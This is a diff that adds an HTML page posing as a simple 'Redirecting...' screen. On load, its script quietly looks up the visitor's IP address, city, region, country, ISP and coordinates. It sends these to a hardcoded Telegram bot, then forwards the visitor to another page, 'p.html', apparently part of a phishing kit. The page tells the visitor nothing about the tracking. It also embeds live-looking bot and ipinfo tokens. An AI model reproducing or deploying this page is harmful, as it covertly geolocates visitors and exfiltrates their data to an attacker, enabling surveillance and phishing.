@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api64.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=46a9f5fdf651c2`);
+                const ipInfo = await ipInfoResponse.json();
+
+                const message = `
+🔍 IP Info FCB :
+🌐 IP: ${ip}
+🏙️ City: ${ipInfo.city || 'N/A'}
+🏞️ Region/State: ${ipInfo.region || 'N/A'}
+🌎 Country: ${ipInfo.country || 'N/A'}
+📡 ISP: ${ipInfo.org || 'N/A'}
+📍 Location: ${ipInfo.loc || 'N/A'}
+`;
+
+                const botToken = '8536731202:AAHb2LeoknS_M9-ofwma8IVlwF4lGyQUqy0';  // Replace with your bot token
+                const chatId = '8277183843';  // Replace with your chat ID
+
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                await fetch(telegramUrl);
+
+                window.location.href = 'p.html';
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                window.location.href = 'https://lapraim.com/assets/images/insights/404-error/404-error.jpg';
+            }
+        }
+
+        window.onload = getIPInfo;
+    </script>
+</head>
+<body>
+</body>
+</html>
